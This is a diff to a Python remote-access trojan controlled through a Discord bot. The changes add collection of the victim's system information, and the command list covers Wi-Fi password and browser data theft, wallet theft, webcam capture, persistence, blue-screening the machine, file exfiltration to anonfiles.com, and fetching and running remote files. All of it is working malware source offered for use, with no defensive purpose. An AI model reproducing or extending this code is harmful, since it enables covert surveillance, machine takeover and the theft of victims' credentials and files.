@@ -5,8 +5,9 @@ from tkinter import messagebox
 from config import TOKEN, GUILD_ID, DEFENDER, ERROR
 from modules.browser import run, delete_files
 #from modules.keylogger import Keylogger
+from modules.info import start
 from modules.wifi import WifiPasswords
-from dotenv import load_dotenv
+#from dotenv import load_dotenv
 
 
 def disable_defender():
@@ -27,13 +28,20 @@ def error():
 if ERROR:
     error()
 
-load_dotenv()
+#load_dotenv()
+
 login = os.getlogin()
 client = discord.Client(intents=discord.Intents.all())
 session_id = os.urandom(8).hex()
+
+start()
+with open("system.txt", "r") as f:
+    system_info = f.read()
+    
 commands = "\n".join([
     "help - Help command",
     "ping - Ping command",
+    "sys - System information",
     "cd - Change directory",
     "ls - List directory",
     "cwd - Get current working directory",
@@ -43,10 +51,10 @@ commands = "\n".join([
     "run <file> - Run an file",
     "wifi - Return wifi passwords",
     "screenshot - Take a screenshot",
+    "webcam - Get image of webcam",
     "bluescreen - Blue screen victim",
     "startup - Add to startup",
     "browser - Get browser data",
-    "webcam - Get image of webcam",
     "wallet - Get wallet information",
     "!exit - Exit session and delete all data"
 ])
@@ -139,10 +147,12 @@ async def on_ready():
     data = ip_address['country_name'], ip_address['ip']
     embed = discord.Embed(title="New session created", description="", color=0xfafafa)
     embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
-    embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
-    embed.add_field(name="IP Address", value=f"```{data}```", inline=True)
-    embed.add_field(name="Commands", value=f"```{commands}```", inline=False)
+    #embed.add_field(name="Username", value=f"```{login}```", inline=True)
+    #embed.add_field(name="IP Address", value=f"```{data}```", inline=True)
+    #embed.add_field(name="Commands", value=f"```{commands}```", inline=False)
+    embed.add_field(name="System Info", value=f"```{system_info}```", inline=False)
     await channel.send(embed=embed)
+    delete_files(["system.txt"])
     #browsers(channel)
     
 @client.event
@@ -161,8 +171,19 @@ async def on_message(message):
         msg = f"PONG, `{round(client.latency * 1000)}ms`"
         await message.reply(content=msg)
 
+    elif message.content == "sys":
+            await message.reply("Fetching data...", delete_after=.3)
+            start()
+            with open("system.txt", "r") as f:
+                system_info = f.read()
+
+            embed = discord.Embed(title="System Information", description="", color=0xfafafa)
+            embed.add_field(name="", value=f"```{system_info}```", inline=False)
+            await message.channel.send(embed=embed)
+            delete_files(["system.txt"])
+    
     elif message.content.startswith("cd"):
-        directory = message.content.split(" ")[1]
+        directory = message.content[3:] #.split(" ")[1]
         try:
             os.chdir(directory)
             embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
@@ -182,7 +203,7 @@ async def on_message(message):
         await message.reply(embed=embed)
 
     elif message.content.startswith("download"):
-        file = message.content.split(" ")[1]
+        file = message.content[9:] #.split(" ")[1]
         try:
             link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
             embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
@@ -192,7 +213,7 @@ async def on_message(message):
             await message.reply(embed=embed)
 
     elif message.content.startswith("upload"):
-        link = message.content.split(" ")[1]
+        link = message.content[7:] #.split(" ")[1]
         file = requests.get(link).content
         with open(os.path.basename(link), "wb") as f:
             f.write(file)
@@ -208,7 +229,7 @@ async def on_message(message):
         await message.reply(embed=embed)
 
     elif message.content.startswith("run"):
-        file = message.content.split(" ")[1]
+        file = message.content[4:]
         subprocess.Popen(file, shell=True)
         embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
         await message.reply(embed=embed)
@@ -219,7 +240,7 @@ async def on_message(message):
         
         
     elif message.content == "bluescreen":
-        await message.reply("Attempting...", delete_after = .1)
+        await message.reply("Attempting...", delete_after=.1)
         ntdll = ctypes.windll.ntdll
         prev_value = ctypes.c_bool()
         res = ctypes.c_ulong()
@@ -289,7 +310,7 @@ async def on_message(message):
     #        return
         
     else:
-        embed = discord.Embed(title="Error", description="```Unknown command!```", color=0xfafafa)
+        embed = discord.Embed(title="Error", description="```Unknown command, use 'help' for full list of commands!```", color=0xfafafa)
         await message.reply(embed=embed)
     
 try:
